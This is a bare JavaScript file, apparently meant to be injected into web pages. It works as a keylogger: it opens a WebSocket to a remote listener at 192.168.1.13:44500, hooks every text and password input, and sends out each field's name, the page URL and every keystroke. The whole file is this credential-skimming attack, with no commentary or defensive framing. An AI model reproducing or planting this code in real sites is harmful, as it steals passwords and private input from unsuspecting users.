if ("WebSocket" in window)
{
  var socket = new WebSocket("ws://192.168.1.13:44500");
  var all_input_fields = document.getElementsByTagName("input");
  var page_url = document.baseURI;
  var now = Date();

  socket.onopen = function()
  {
    if (all_input_fields.length > 0)
    {
      socket.send("\n\n --------------- " + now + " --------------- ");
      socket.send("\nURL: " + page_url + "\n");
      var all = "";

      for (var i = 0; i < all_input_fields.length; i++)
      {
        if ((all_input_fields[i].type.toLowerCase() == "text") || (all_input_fields[i].type.toLowerCase() == "password"))
        {
          all_input_fields[i].onfocus = function()
          {
            socket.send("\n##########\n" + this.name + " --> ");
          }

          all_input_fields[i].onkeydown = function(sniffed_key)
          {
            socket.send(sniffed_key.keyCode);
          }
        }
      }
    }
  }

  socket.onbeforeunload = function()
  {
    socket.close();
  }
}
